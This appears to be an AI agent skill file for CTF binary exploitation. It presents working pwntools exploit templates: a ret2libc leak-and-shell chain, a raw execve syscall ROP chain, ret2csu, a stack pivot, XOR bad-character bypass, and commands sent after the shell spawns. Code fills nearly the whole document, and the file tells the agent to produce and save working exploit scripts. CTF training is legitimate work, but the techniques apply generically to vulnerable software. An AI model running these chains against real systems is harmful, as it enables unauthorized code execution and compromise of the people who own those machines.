---
name: pwn-rop
description: "CTF binary exploitation ROP chains and shellcode. ret2libc, ret2csu, raw syscall ROP, rdx control, stack pivot, bad character bypass via XOR, exotic gadgets (BEXTR/XLAT/STOSB), sprintf gadget chaining. Triggers: 'rop chain', 'ret2libc', 'rop gadget', 'pwn rop', 'binary exploitation', 'ctf pwn', 'stack overflow rop', 'ret2csu', 'shellcode', 'stack pivot', 'rdx control'."
---

# CTF Pwn: ROP Chains and Shellcode

ret2libc, ret2csu, raw syscall, bad char bypass, stack pivot, exotic gadgets.

## Install

```bash
pip install pwntools --break-system-packages
apt-get install -y gdb gdb-multiarch patchelf
pip install pwndbg --break-system-packages  # or: git clone https://github.com/pwndbg/pwndbg && ./setup.sh
```

---

## Phase 1: Binary Recon

```bash
BINARY="./challenge"

# Security features:
checksec $BINARY
file $BINARY
readelf -h $BINARY

# Find offset to return address:
cyclic 200 | ./challenge   # gdb: x/wx $rsp → cyclic_find(0xXXXX)
python3 -c "from pwn import *; print(cyclic_find(b'faab'))"

# Find gadgets:
ROPgadget --binary $BINARY | grep "pop rdi"
ROPgadget --binary $BINARY | grep "ret"
ropper -f $BINARY --search "pop rdi"
```

---

## Phase 2: Two-Stage ret2libc (Leak + Shell)

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)
context.binary = elf

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
OFFSET = 40  # adjust via cyclic_find

io = process('./binary')

# Stage 1: Leak puts() address → calculate libc base
payload1 = flat(
    b'A' * OFFSET,
    pop_rdi, elf.got['puts'],
    elf.plt['puts'],
    # Return to 'call vuln' instruction in main (cleaner than main):
    elf.symbols['main']  # adjust if needed
)

io.sendline(payload1)
io.recvuntil(b'Laundry complete')  # adjust to match binary output
leaked = u64(io.recvline().strip().ljust(8, b'\x00'))
libc_base = leaked - libc.symbols['puts']
print(f"libc base: {hex(libc_base)}")

# Stage 2: Shell using libc gadgets
libc.address = libc_base
libc_rop = ROP(libc)
pop_rdi_libc = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
ret_libc = libc_rop.find_gadget(['ret'])[0]
binsh = next(libc.search(b'/bin/sh'))

payload2 = flat(
    b'A' * OFFSET,
    ret_libc,           # stack alignment
    pop_rdi_libc,
    binsh,
    libc.symbols['system']
)

io.sendline(payload2)
io.interactive()
```

---

## Phase 3: Raw Syscall ROP (When system() Crashes)

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
libc.address = LIBC_BASE  # from leak
libc_rop = ROP(libc)

# Modern glibc: pop rdx; pop rbx; ret (pop rdx; ret is rare)
pop_rdx_rbx = libc_rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
pop_rax = libc_rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = libc_rop.find_gadget(['pop rsi', 'ret'])[0]
syscall_ret = libc_rop.find_gadget(['syscall', 'ret'])[0]
binsh = libc.address + next(libc.search(b'/bin/sh'))

OFFSET = 40

# execve("/bin/sh", NULL, NULL) = syscall 59
payload = flat(
    b'A' * OFFSET,
    libc.address + pop_rax, 59,
    libc.address + pop_rdi, binsh,
    libc.address + pop_rsi, 0,
    libc.address + pop_rdx_rbx, 0, 0,
    libc.address + syscall_ret
)
```

---

## Phase 4: ret2csu (rdx Control Without pop rdx gadget)

```python
from pwn import *

elf = ELF('./binary')
# Gadget offsets in __libc_csu_init:
CSU_POP = elf.symbols['__libc_csu_init'] + 0x4a  # pop rbx/rbp/r12/r13/r14/r15; ret
CSU_CALL = elf.symbols['__libc_csu_init'] + 0x40  # mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]

OFFSET = 40

payload = flat(
    b'A' * OFFSET,
    CSU_POP,
    0,                    # rbx = 0
    1,                    # rbp = 1 (loop exit condition)
    elf.got['puts'],      # r12 = GOT entry (function to call)
    0xdeadbeef,           # r13 → edi (first arg, 32-bit!)
    0xcafebabe,           # r14 → rsi (second arg)
    0x12345678,           # r15 → rdx (third arg)
    CSU_CALL,             # trigger: mov rdx,r15; ...; call [r12]
    b'\x00' * 56,         # padding: 7 pops (rbx,rbp,r12,r13,r14,r15 + ret cleanup)
    NEXT_GADGET,          # return after csu completes
)
```

---

## Phase 5: Stack Pivot via xchg rax,esp

```python
from pwn import *

elf = ELF('./binary')
pop_rax = elf.symbols['usefulGadgets']           # pop rax; ret
xchg_rax_esp = elf.symbols['usefulGadgets'] + 2  # xchg rax, esp; ret

# Stage 1: Write ROP chain to known address (via prior input):
pivot_addr = KNOWN_HEAP_ADDR

stage2 = flat(
    pop_rdi, elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']
)
io.send(stage2)   # Written to pivot_addr by program

# Stage 2: Overflow with stack pivot:
payload = flat(
    b'A' * OFFSET,
    pop_rax, pivot_addr,   # rax = pivot address
    xchg_rax_esp,          # esp = rax (truncates to 32-bit! must be < 4GB)
)
# Note: pivot_addr must be in lower 4GB (xchg truncates rax → eax)
```

---

## Phase 6: Bad Character Bypass via XOR

```python
from pwn import *

elf = ELF('./binary')
pop_r14_r15 = ...   # pop r14; pop r15; ret
mov_r14_to_r15 = ... # mov [r15], r14; ret
xor_r15_r14 = ...    # xor [r15], r14; ret
pop_rdi = ...
data_section = elf.symbols['__data_start']

XOR_KEY = 2
target = b"flag.txt"
encoded = bytes(b ^ XOR_KEY for b in target)

OFFSET = 40
payload = b'A' * OFFSET

# Write XOR'd data:
for i in range(0, len(encoded), 8):
    chunk = encoded[i:i+8].ljust(8, b'\x00')
    payload += flat(
        pop_r14_r15, chunk, data_section + i,
        mov_r14_to_r15,
    )

# Decode in-place:
for i in range(0, len(target), 8):
    payload += flat(
        pop_r14_r15, p64(XOR_KEY), data_section + i,
        xor_r15_r14,
    )

# Call function with decoded arg:
payload += flat(pop_rdi, data_section, elf.plt['print_file'])
```

---

## Phase 7: Shell Interaction Post-execve

```python
import time

io.send(payload)  # trigger execve

time.sleep(1)
io.sendline(b'cat /flag*')
time.sleep(0.5)
flag = io.recv(timeout=3)
print(flag.decode())

# Don't pipe via stdin: use explicit sendline() after delay
```

---

## Quick Reference: Syscall Numbers (x86-64)

| Syscall | Number | Args |
|:--------|:------:|:-----|
| read | 0 | rdi=fd, rsi=buf, rdx=len |
| write | 1 | rdi=fd, rsi=buf, rdx=len |
| open | 2 | rdi=path, rsi=flags |
| execve | 59 | rdi=path, rsi=argv, rdx=envp |
| mmap | 9 | rdi=addr, rsi=len, rdx=prot, r10=flags |

---

## Output

Save to `.omop/engagement/ctf/pwn/`:
- `exploit.py`: working exploit script
- `flag.txt`: captured flag

## Next Phase

→ `ctf-pwn-advanced` for heap exploitation, kernel pwn, format string
→ `ctf-reverse` for reverse engineering the binary first
